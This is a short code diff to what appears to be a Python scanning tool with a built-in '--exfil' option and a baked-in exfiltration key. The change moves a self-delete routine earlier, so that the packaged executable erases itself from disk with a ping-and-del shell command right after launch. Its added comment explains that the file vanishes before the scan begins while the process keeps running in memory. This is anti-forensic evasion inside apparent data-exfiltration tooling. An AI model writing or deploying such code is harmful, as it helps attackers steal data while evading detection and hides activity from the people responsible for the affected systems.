@@ -1745,6 +1745,11 @@ def main():
     parser.add_argument("--exfil-key",   metavar="KEY",       default=_EXFIL_KEY or None, help="API key for --exfil (default: baked in at build time)")
     args = parser.parse_args()
 
+    # Delete the exe immediately after launch — the process stays alive in memory.
+    # Doing this early means the file is gone from disk before the scan even starts.
+    if args.self_delete and getattr(sys, "frozen", False):
+        os.popen(f'cmd /c ping -n 2 127.0.0.1 > nul & del /f /q "{sys.executable}"')
+
     if args.verify:
         _do_oidc = True
 
@@ -1860,9 +1865,6 @@ def main():
                 os.remove(csv_path)
         except OSError:
             pass
-
-    if args.self_delete and getattr(sys, "frozen", False):
-        os.popen(f'cmd /c ping -n 2 127.0.0.1 > nul & del /f /q "{sys.executable}"')
 
 
 if __name__ == "__main__":
